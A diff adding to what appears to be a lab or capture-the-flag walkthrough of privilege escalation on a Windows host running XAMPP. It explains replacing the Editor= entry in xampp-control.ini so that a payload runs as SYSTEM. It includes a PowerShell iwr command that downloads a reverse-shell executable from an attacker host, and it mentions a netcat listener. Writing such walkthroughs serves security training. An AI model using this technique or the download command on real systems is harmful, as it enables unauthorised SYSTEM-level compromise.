@@ -253,6 +253,60 @@ nothing seems to work here we see XAMPP version. As we know there is xampp in C 
 
 ![](Images/Monster19.png)
 
+Downloaded the above exploit.
 
+![](Images/Monster20.png)
+
+Opened `C:\xampp\xampp-control.ini`
+
+![](Images/Monster21.png)
+
+This exploit replaces the XAMPP Control Panel’s text editor with a malicious executable. Perfect!
+
+First, I generated a reverse shell payload:
+### Understand the Vulnerability (Very Important)
+
+The exploit abuses **xampp-control.ini configuration file**.
+
+File:
+
+`C:\xampp\xampp-control.ini`
+
+Inside the file there is a parameter:
+
+`Editor=`
+
+Normally it launches something like:
+
+`notepad.exe`
+
+But **if we replace it with our malicious executable**, then when **XAMPP Control Panel runs**, it will execute our payload.
+
+And **XAMPP runs as SYSTEM**.
+
+So our payload runs as **SYSTEM**.
+
+Result: **Privilege Escalation**
+
+
+Generating reverse shell payload.
+
+![](Images/Monster22.png)
+
+Transferred the exploit to target on desired location.
+
+```cmd
+iwr -uri http://192.168.45.210:8000/rev1.exe -Outfile rev1.exe
+```
+
+![](Images/Monster23.png)
+
+![](Images/Monster24.png)
+
+Following the exploit’s PowerShell commands to replace the `xampp-control.ini` configuration file, I successfully obtained a reverse shell as SYSTEM.
+
+Before running the commands, we started nc on other terminal.
+
+![](Images/Monster25.png)
 
 
